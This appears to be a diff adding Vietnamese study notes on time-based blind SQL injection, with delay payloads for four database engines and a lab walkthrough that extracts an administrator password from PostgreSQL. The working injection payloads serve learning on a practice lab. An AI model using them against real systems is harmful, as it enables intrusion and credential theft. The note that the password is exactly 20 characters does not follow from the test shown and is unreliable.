@@ -626,6 +626,94 @@ Khi ta thử chèn ' và đằng sau trường TrackingId thì ta thấy thông 
 
 -----------------------------------------------------------------------------------------------
 
+```Exploiting blind SQL injection by triggering time delays```
+
+- Có thể khai thác blind sql injection bằng cách tạo ra độ trễ thời gian tùy thuộc vào điều kiện đúng hay là sai 
+
+- Các kỹ thuật kích hoạt độ trễ thời gian phụ thuộc vào loại database đang được sử dụng 
+
+```'; IF (1=2) WAITFOR DELAY '0:0:10'--```
+```'; IF (1=1) WAITFOR DELAY '0:0:10'--```
+
+- Payload đầu tiên không gây ra độ trễ vì điều kiện 1=2 là sai
+- Payload thứ 2 gây ra độ trễ 10 giây vì điều kiện 1=1 là đúng
+
+- Sử dụng kỹ thuật này, ta có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một: 
+
+```'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--```
+
+- Mỗi version database có một cách làm khác nhau
+
+- Các payload sau có thể gây ra độ trễ thời gian 10s 
+
+- Oracle:	dbms_pipe.receive_message(('a'),10)
+
+- Microsoft:	WAITFOR DELAY '0:0:10'
+
+- PostgreSQL:	SELECT pg_sleep(10)
+
+- MySQL:	SELECT SLEEP(10)
+
+- Ta có thể kiểm tra một điều kiện boolean và kích hoạt độ trễ thời gian nếu điều kiện đó đúng 
+
+- Orcale: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+
+- Microsoft: IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+
+- PostgreSQL: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+
+- MySQL: SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+
+------------------------------------------------------------------------------------------------------
+
+```LAB: Blind SQL injection with time delays and information retrieval```
+
+- Mục tiêu: Đăng nhập vào tài khoản administrator
+
+- Ta xác định được bài lab nàu dùng version database là PostgreSQL vậy nên ta sẽ dùng payload để xem có độ trễ thời gian ở đây không
+
+```Payload: '%3BSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--```
+
+![alt text](image-60.png)
+
+=> Ta thấy response trả về trễ 10s 
+
+=> Xác nhận có lỗ hổng Blind SQL Injection ở đây 
+
+- Giờ ta thay payload trên từ 1=1 sang 1=2 để kích hoạt False trong câu query thì thấy response trả về ngay lập từ 
+
+![alt text](image-61.png)
+
+=> Xác nhận rằng ta có thể dùng việc delay thời gian này để xác định điều kiện SQL đúng hay là sai 
+
+- Tiếp theo ta kiểm tra xem có tồn tại username = administrator hay không 
+
+```Payload: '%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--```
+
+![alt text](image-62.png)
+
+=> Trễ 10 giây => xác định rằng có username = 'administrator'
+
+- Tiếp theo ta xác định độ dài password
+
+```Payload: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--```
+
+![alt text](image-63.png)
+
+=> Trả về ngay lập tức => password có 20 ký tự 
+
+Giờ ta sẽ dùng Intruder để brute_force password
+
+```Payload: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--```
+
+![alt text](image-64.png)
+
+---------------------------------------------------------------------------------------------------------
+
+
+
+
+
 
 
 
